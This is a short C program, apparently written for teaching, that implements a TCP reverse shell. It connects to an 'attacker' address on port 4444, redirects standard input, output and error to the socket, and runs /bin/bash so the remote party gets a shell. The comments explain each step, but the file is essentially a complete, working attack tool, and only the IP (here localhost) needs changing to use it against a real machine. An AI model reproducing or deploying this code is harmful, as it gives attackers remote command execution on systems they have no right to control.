#include <stdio.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {

  // Attacker's IP addr - the addr to connect to
  const char* attacker_ip = "127.0.0.1";

  // Define network socket struct
  struct sockaddr_in target_address;
  // set the addr family to IPv4
  target_address.sin_family = AF_INET;
  // set port to 4444 - htons converts port number from host byte order
  // (little endian) to network byte order (big endian)
  target_address.sin_port = htons(4444);
  // inet_aton() converts an IPv4 addr in text to binary form
  // set the sin_addr to the attacker's ip addr
  inet_aton(attacker_ip, &target_address.sin_addr);

  // Create a socket with TCP
  int socket_fd = socket(AF_INET, SOCK_STREAM, 0);

  // Connect to the attacker
  connect(socket_fd, (struct sockaddr*)(&target_address), sizeof(target_address));

  // Redirect standard input, standard output, standard error
  dup2(socket_fd, 0); // stdin
  dup2(socket_fd, 1); // stdout
  dup2(socket_fd, 2); // stderr
  
  // Execute a shell so attacker has access
  execve("/bin/bash", NULL, NULL);

  return 0;
}
